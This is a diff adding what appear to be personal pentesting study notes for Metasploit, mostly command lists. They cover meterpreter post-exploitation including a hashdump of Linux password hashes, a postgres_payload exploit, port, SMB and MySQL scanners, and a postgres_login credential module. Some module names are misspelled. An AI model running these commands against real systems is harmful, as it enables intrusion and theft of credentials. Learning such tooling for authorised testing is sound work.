@@ -105,7 +105,45 @@ Step -
 		  	> id 
 			> exit
 		  > in the meterpreter session u can run cmds such as ifconfig, netstat, arp ,route, upload and download
-      			
+		  > background
+		  > search post or search hasdump
+		  > sessions -i 1
+		  > run /post/linux/gather/hashdump  // this will only run if the account with session is root type or allowed
+		  > ps // to know processes on target
+		  > sysinfo
+		  
+ Scanners in msfconsole -> 
+ 		msfconsole > hosts // show the connected systems
+			   > services // to show the service with which the meterpreter shell connection is established
+			   > hosts -d ip // to remove host 
+			   > nmap -h // for scan list cmds
+			   > nmap -A ip
+      			   > db_nmap -A ip // this will pull and populate the database with scan info
+			   > hosts // now this find will be populated
+			   > services
+			   > creds
+			   > search postgres
+			   > use exploit/linux/postgres/postgres_payload
+			   > exploit
+			   > ifconfig
+			   > exit
+			   > back
+			   > creds // it should also be get populated now
+			   > search portscan 
+			   > use auxillary/scanner/portscan/tcp
+			   > setg RHOSTS ip
+			   > exploit
+			   > search scanner
+			   > search smb_version
+			   > use auxillary/scanner/smb/smb_version
+			   > show options
+			   > exploit
+			   > search services // choose one out of them such as mysql
+			   > use auxillary/scanner/mysql/mysql_version
+			   > exploit
+			   > use auxillary/scanner/postgres/postgres_login
+			   > creds 
+			   
       
 Step - Footprinting phase allows the attacker to gather the information regarding internal and external security architecture, he 
        has to face a target
